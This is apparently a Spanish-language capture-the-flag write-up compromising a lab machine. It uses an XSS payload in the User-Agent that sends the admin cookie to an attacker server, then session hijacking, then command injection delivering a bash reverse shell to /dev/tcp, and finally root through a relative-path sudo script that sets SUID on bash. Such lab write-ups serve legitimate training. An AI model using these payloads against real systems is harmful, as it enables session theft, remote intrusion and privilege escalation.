PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

-Entramos al puerto 5000 y vemos que podemos rellenar un formulario. 

-Intentamos inyectar un XSS en algún campo pero nos sale el siguiente mensaje:
	Hacking Attempt Detected
	'Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation'
		-Sale nuestra información del BurpSuite

-Parece que se está aplicando filtrado en los campos y cuando detecta actividad maliciosa envían los datos del navegador (Los parámetros que salen en BurpSuite) al administrador.

**-NOTA:** Nos sale la **VENTANA EMERGENTE** si hacemos lo siguiente:
	-Interceptamos la Petición en /support:
		-SIN MANDARLO al Repeater hacemos esto:
			-POST /support HTTP/1.1
			Host: 10.10.11.8:5000
			User-Agent: <script>alert('XSS')</script>
			fname=test&lname=test&email=test%40test&phone=123456789&**message=<>**
			-LE DAMOS A **FORWARD** , al volver a la página sale la Ventana

-Interceptamos la petición con BurpSuite, vamos a intentar inyectar el Payload XSS en el User-Agent , a ver si conseguimos que lo interprete:
	POST /support HTTP/1.1
	Host: 10.10.11.8:5000
	User-Agent: <script src="http://10.10.14.25/"></script>
	fname=test&lname=test&email=test%40test&phone=123456789&**message=<>**
	(Ponemos **<>** en uno de los campos para que detecte la petición como maliciosa y envíe los datos de los Headers al Adminitrador e interprete el código JS)

-Abrimos un servidor:
	-python3 -m http.server 80
		"GET / HTTP/1.1" 200
		(FUNCIONA!! , Hemos recibido conexión!!)

-Inyectamos Código para robar la Cookie del Administrador:
	POST /support HTTP/1.1
	Host: 10.10.11.8:5000
	User-Agent: <img src=q onerror="new Image().src='http://10.10.14.25/?c='+document.cookie">

-Abrimos un servidor:
	-python3 -m http.server 80
		"GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1"
		(HEMOS CONSEGUIDO LA COOKIE DE ADMIN!!)

-Secuestramos la Cookie (Cookie Hijacking) e ingresamos a /dashboard con la sesión de 'admin'

-En **/dashboard** encontramos un Panel de Administrador que nos permite generar reportes en base a una Fecha. Interceptamos la Petición con BurpSuite y encontramos el parámetro 'date':
	POST /dashboard HTTP/1.1
	Host: 10.10.11.8:5000
	date=2023-09-15;id (Probamos **Command Injection**)
		**uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)**

-Nos mandamos una **RS URL Encoded** a través del **Command Injection**:
	date=2023-09-15;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.25%2F1234%200%3E%261%27
		**dvir@headless:~/app$ whoami**
			**dvir**

## Escalada de Privilegios

-sudo -l:
	(ALL) NOPASSWD: /usr/bin/syscheck

-Es un script que ejecuta como root otro script --> initdb.sh

-La vulnerabilidad es esta:
	./initdb.sh 2>/dev/null

-Está ejecutando el script con la Ruta Relativa, de tal modo que busca el script en el directorio actual dónde lo estes ejecutando.

-Nos creamos un script llamado initdb.sh en /tmp con el siguiente contenido:
	-chmod u+s /bin/bash

-Le damos permisos de Ejecución y ejecutamos '/usr/bin/syscheck':
	-chmod +x initdb.sh
	-sudo /usr/bin/syscheck

-bash -p
	bash-5.2# whoami
		root
